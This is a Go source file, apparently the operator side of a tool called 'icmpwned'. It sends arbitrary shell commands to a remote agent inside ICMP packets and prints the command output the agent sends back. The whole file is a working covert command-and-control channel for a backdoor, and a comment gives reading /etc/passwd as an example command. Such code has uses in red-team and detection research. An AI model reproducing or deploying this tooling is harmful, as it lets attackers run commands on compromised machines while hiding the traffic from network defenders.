package main

import (
	"net"
	"os"
	"strconv"
	"time"

	"github.com/s-christian/icmpwned/lib/logger"
	"github.com/s-christian/icmpwned/lib/system"
	"github.com/s-christian/icmpwned/lib/utils"
	"golang.org/x/net/ipv4"
)

var (
	target  string // ex - 192.168.149.129
	command string // ex - Linux: cat /etc/passwd; Windows: Get-ChildItem C:/Users
)

func main() {
	if len(os.Args) != 3 {
		logger.Log(logger.Error, os.Args[0], "usage:", os.Args[0], "<target> <command>")
		os.Exit(logger.ERR_USAGE)
	}

	target = os.Args[1]  // agent to send command to
	command = os.Args[2] // command string to execute in target's shell (Linux: Bash, Windows: PowerShell)

	// Resolve any DNS (if used) to get the real IP of the target
	targetIP, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		logger.LogError(err)
		os.Exit(logger.ERR_CONNECTION)
	}

	// Create ICMP connection to send packet over
	conn, err := utils.ListenICMP(system.GetHostIP().String())
	if err != nil {
		logger.Log(logger.Error, "Could not start raw ICMP listener")
		logger.LogError(err)
		os.Exit(logger.ERR_CONNECTION)
	}

	logger.Log(logger.Info, "Sending command to", targetIP.String(), "and listening for reply")

	// Send command to target
	startTime, err := utils.SendICMPData(conn, targetIP, []byte(command))
	if err != nil {
		logger.LogError(err)
		os.Exit(logger.ERR_CONNECTION)
	}

	// Wait for reply - ensure we're not receiving an Echo, but our custom reply
	err = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		logger.LogError(err)
		os.Exit(logger.ERR_GENERIC)
	}
	for {
		rawReply, icmpType, srcAddr, magic, err := utils.ParseICMPConnection(conn)
		if err != nil {
			logger.LogError(err)
			break
		}
		if srcAddr.String() != targetIP.String() {
			logger.Log(logger.Error, "Source address does not match target address: sent to", targetIP.String()+", received from", srcAddr.String(), "=>", string(rawReply))
			continue
		}
		if !magic {
			logger.Log(logger.Error, "Reply from", srcAddr.String(), "does not contain magic =>", string(rawReply))
			continue
		}

		duration := time.Since(startTime)

		switch icmpType {
		case ipv4.ICMPTypeEchoReply:
			logger.Log(logger.List, "Caught Echo Reply from", srcAddr.String(), "in", duration.String())
			continue
		default:
			logger.Log(logger.Done, "Output from", srcAddr.String(), "("+strconv.Itoa(len(rawReply)), "bytes in", duration.String()+"):"+"\n"+string(rawReply))
			return
		}
	}
}
